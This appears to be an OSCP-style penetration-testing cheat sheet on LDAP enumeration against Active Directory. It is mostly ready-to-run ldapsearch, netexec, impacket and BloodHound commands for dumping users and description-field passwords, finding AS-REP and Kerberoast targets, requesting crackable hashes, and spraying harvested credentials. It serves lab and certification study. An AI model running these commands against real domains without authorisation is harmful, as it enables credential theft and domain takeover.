# 🔧 LDAP — Ports 389 / 636 / 3268 / 3269

> **Lightweight Directory Access Protocol** — the query interface to a directory, almost always **Active Directory** on OSCP. Ports: **389** LDAP (cleartext/STARTTLS, sniffable), **636** LDAPS/TLS, **3268/3269** Global Catalog (forest-wide — use on big domains). Binds: *anonymous*, *simple* (user+pass), *SASL/Kerberos*. Anonymous or authenticated `ldapsearch` dumps users, groups, computers, descriptions (often with passwords!), and SPNs. The richest **enumeration** surface for a domain and the source of AS-REP / Kerberoast targets. Key attributes: `sAMAccountName`, `description`, `memberOf`, `servicePrincipalName`, `userAccountControl`.

Related: [[Active Directory]] · [[Kerberos]] · [[SMB]] · [[RPC]] · [[Credential Attacks]]

---

## 🧠 PORT 389 → THINK
- **389** LDAP · **636** LDAPS · **3268/3269** Global Catalog (whole forest, use these on big domains).
- Try **anonymous bind** first — sometimes dumps the whole directory.
- Grep every user's **`description`** field — admins hide passwords there constantly.
- Pull **Base DN** first (`namingContexts`), then query.
- Domain controller confirmed → go [[Active Directory]] (AS-REP, Kerberoast, BloodHound).
- Combine with [[RPC]] (rpcclient) and [[Kerberos]].

## ⚡ QUICK TRIAGE (60 sec)
```bash
export IP=10.10.10.10
```

```bash
# Grab the naming context (Base DN) anonymously
ldapsearch -x -H ldap://$IP -s base namingContexts
```

```bash
nmap -p389 --script ldap-rootdse $IP
```
**Verdict:** anonymous bind returns data → dump users/descriptions now. Bind rejected → need creds; enumerate via [[RPC]] instead.

## ⏱️ ENUMERATE
```bash
# 1) Base DN
ldapsearch -x -H ldap://$IP -s base namingContexts          # -> dc=corp,dc=local
```

```bash
BASE='dc=corp,dc=local'
```

```bash
# 2) Bind: anonymous, or simple (sAMAccountName / user@domain / DOMAIN\user / full DN); LDAPS on 636 if 389 restricted
ldapsearch -x -H ldap://$IP -b "$BASE" > ldap_all.txt                                   # anonymous dump
```

```bash
ldapsearch -x -H ldap://$IP -D 'jdoe@corp.local' -w 'Password1' -b "$BASE" > ldap_auth.txt   # authenticated (far more data)
```

```bash
ldapsearch -x -H ldaps://$IP -b "$BASE"                                                 # LDAPS fallback
```

```bash
# 3) The gold: users + description fields (passwords hide here)
ldapsearch -x -H ldap://$IP -b "$BASE" "(objectClass=user)" sAMAccountName description | grep -iE 'sAMAccountName|description'
```

```bash
# Groups / Domain Admins / computers
ldapsearch -x -H ldap://$IP -b "$BASE" "(objectClass=group)" cn member
```

```bash
ldapsearch -x -H ldap://$IP -b "$BASE" "(cn=Domain Admins)" member
```

```bash
ldapsearch -x -H ldap://$IP -b "$BASE" "(objectClass=computer)" name operatingSystem
```

```bash
# 4) Roast targets
ldapsearch -x -H ldap://$IP -b "$BASE" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName  # AS-REP roastable
```

```bash
ldapsearch -x -H ldap://$IP -b "$BASE" \
  "(&(objectCategory=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName        # Kerberoastable
```

```bash
# netexec convenience wrappers
netexec ldap $IP -u '' -p '' --users
```

```bash
netexec ldap $IP -u user -p pass --asreproast asrep.txt
```

```bash
netexec ldap $IP -u user -p pass --kerberoasting kerb.txt
```

```bash
netexec ldap $IP -u user -p pass -M user-desc      # dump descriptions
```
**Look for:** `sAMAccountName` → `users.txt`; `description` with a password; AS-REP users (roast with no creds); SPN accounts (Kerberoast); group memberships (path to Domain Admins).
> TLS/cert errors on 636 → `LDAPTLS_REQCERT=never ldapsearch ...`

## 🗡️ EXPLOIT
- 🟢 **Anonymous bind → userlist + descriptions (creds!).**
- 🟢 **Discover AS-REP users** (`DONT_REQ_PREAUTH`) → roast without any creds → [[Kerberos]].
- 🟢 **Discover SPN accounts** → Kerberoast (needs one valid cred) → crack → [[Credential Attacks]].
- 🟡 **BloodHound collection** (authenticated) → shortest path to DA → [[Active Directory]].
- 🔵 **Cleartext creds in `info`/`description`/`comment` fields.**
- 🔵 **LDAP simple-bind sniffing** (situational, needs MITM position).

LDAP is enumeration, not direct RCE. The foothold chain:
1. Anonymous/authenticated dump → `users.txt` + any passwords in descriptions.
2. AS-REP roast: `impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip $IP` → crack hash.
3. With one cred → Kerberoast: `impacket-GetUserSPNs corp.local/user:pass -dc-ip $IP -request` → crack.
4. Cracked cred → [[WinRM]] / [[SMB]] shell.

**After access:** with a domain shell/creds run BloodHound (`bloodhound-python -d corp.local -u user -p pass -c all -ns $IP`), map ACLs, target DA path. See [[Active Directory]].

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| Anonymous bind works | Free enum | dump users + descriptions | userlist/creds |
| Password in `description` | Creds leaked | test on SMB/WinRM | shell |
| User with DONT_REQ_PREAUTH | AS-REP roastable | `GetNPUsers -no-pass` | crackable hash |
| User with SPN | Kerberoastable | `GetUserSPNs -request` | crackable hash |
| `memberOf` Domain Admins | High-value user | target their creds | domain compromise |
| Bind rejected | Need creds | get cred elsewhere → return | full dump |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Anonymous bind denied | Enumerate users via [[RPC]] (rpcclient/RID-brute); get a cred then bind |
| Don't know Base DN | `ldapsearch -x -s base namingContexts` or `-s base defaultNamingContext`; nmap `ldap-rootdse` |
| 389 filtered | Try 636 (`ldaps://`) and GC 3268/3269 |
| TLS/cert errors on 636 | `LDAPTLS_REQCERT=never ldapsearch ...` |
| Huge output | Restrict attributes (`sAMAccountName description`) and filters |
| Creds rejected | Verify format (`user@domain`, `DOMAIN\user`, or full DN); check clock skew for Kerberos |

## 📋 REFERENCE — mistakes · don't-miss · stop
**Mistakes:** not trying **anonymous bind** at all · ignoring the **`description`/`info` fields** (#1 place passwords hide) · forgetting **Global Catalog 3268** when 389 is restricted or the domain is large · not converting LDAP findings into **AS-REP/Kerberoast** actions · wrong bind username format → assuming "no access" when it's a syntax issue.
**Reuse:** userlist → spray [[SMB]], [[WinRM]], [[RDP]], [[MSSQL]]; passwords from descriptions → test everywhere; roast hashes → crack → same matrix. LDAP + [[Kerberos]] + [[SMB]] = the AD triad. See [[Credential Attacks]].
**Don't miss:** Base DN via `namingContexts` · **anonymous bind** dump · grep **`description`/`info`** for creds · AS-REP filter (`...=4194304`) · SPN filter (`servicePrincipalName=*`) · Global Catalog **3268** if 389 restricted · save users → `users.txt`.
**Stop when:** anonymous denied AND no creds AND RPC/RID enum also blocked → LDAP exhausted anonymously; acquire a cred elsewhere and return authenticated. Once you have users + roast targets, work moves to [[Kerberos]] / [[Credential Attacks]].

## 📇 CHEAT SHEET
```bash
ldapsearch -x -H ldap://$IP -s base namingContexts                    # Base DN
```

```bash
BASE='dc=corp,dc=local'
```

```bash
ldapsearch -x -H ldap://$IP -b "$BASE" "(objectClass=user)" sAMAccountName description
```

```bash
ldapsearch -x -H ldap://$IP -b "$BASE" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName  # AS-REP
```

```bash
ldapsearch -x -H ldap://$IP -b "$BASE" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName  # Kerberoast
```

```bash
netexec ldap $IP -u user -p pass --asreproast a.txt --kerberoasting k.txt
```
**Kill shots:** anonymous dump → password in description → shell · AS-REP/Kerberoast target → crack → shell.
